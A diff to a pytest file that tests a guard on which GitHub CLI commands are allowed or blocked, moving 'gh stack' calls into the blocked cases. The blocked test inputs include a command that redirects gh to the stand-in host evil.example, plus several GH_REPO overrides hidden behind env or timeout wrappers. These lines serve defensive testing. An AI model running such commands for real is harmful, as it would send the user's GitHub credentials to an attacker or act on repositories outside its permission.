@@ -147,10 +147,8 @@ def test_reversible_writes_to_a_trusted_owner_are_allowed(command: str) -> None:
         pytest.param("gh api repos/o/r/actions/runs --paginate -H 'Accept: application/json'", id="a header read"),
         pytest.param("gh pr checkout 12", id="a checkout, which changes only the local repository"),
         pytest.param("gh repo clone furedea/agent-config", id="a clone"),
-        pytest.param("gh stack init", id="an interactive stack init"),
         pytest.param('gh run watch "$R" --repo furedea/agent-config --exit-status 2>&1', id="a quoted run id"),
         pytest.param('gh pr view "$n" --json number,state --jq .state', id="a quoted PR number"),
-        pytest.param("gh stack add my_feature/part", id="a stack branch with a slash"),
         pytest.param("gh pr checkout user/feat/x", id="a checkout of a branch with slashes"),
         pytest.param("gh repo view furedea/agent-config", id="a repository view by owner and name"),
         pytest.param("gh pr view release/v1.2/x", id="a PR view of a branch with dots and slashes"),
@@ -297,7 +295,6 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
             'export GH_"HOST"=evil.example; gh api -X GET user', "environment", id="a quoted variable name exported"
         ),
         pytest.param("gh pr checkout 1 --foo", "operation table", id="an unlisted checkout option"),
-        pytest.param('gh stack add "$NAME"', "run time", id="a run-time stack branch"),
         pytest.param("GH_REPO=other/r gh issue comment 1 -b x", "environment", id="GH_REPO on the line"),
         pytest.param("env GH_REPO=other/r gh issue comment 1 -b x", "environment", id="GH_REPO through env"),
         pytest.param("timeout 9 gh issue comment 1 -b x", "environment", id="a wrapper hiding the environment"),
@@ -309,11 +306,10 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         pytest.param("gh issue edit 1 -R furedea/r --remove-parent", "operation table", id="a parent removal"),
         pytest.param("gh pr edit 1 -R furedea/r", "at least one option", id="a PR edit with nothing to change"),
         pytest.param("gh pr create -R furedea/r -H topic -b safe", "needs one of", id="a PR without a title"),
-        pytest.param("gh stack submit", "needs one of", id="an interactive stack submit"),
-        pytest.param("gh stack submit --auto", "class D", id="a stack submit, which pushes unscanned commits"),
-        pytest.param("gh stack push", "class D", id="a stack push"),
         pytest.param("gh run rerun 123 --failed", "class D", id="a run rerun, whose jobs act outside"),
         pytest.param("gh run cancel 123", "class D", id="a run cancel, which cannot be resumed"),
+        pytest.param("gh stack view", "operation table", id="a stack call, which runs an unverified extension"),
+        pytest.param("gh stack submit --auto", "operation table", id="a stack submit"),
         pytest.param(
             "gh run watch $R --repo furedea/agent-config --exit-status 2>&1", "may split", id="logged run watch"
         ),
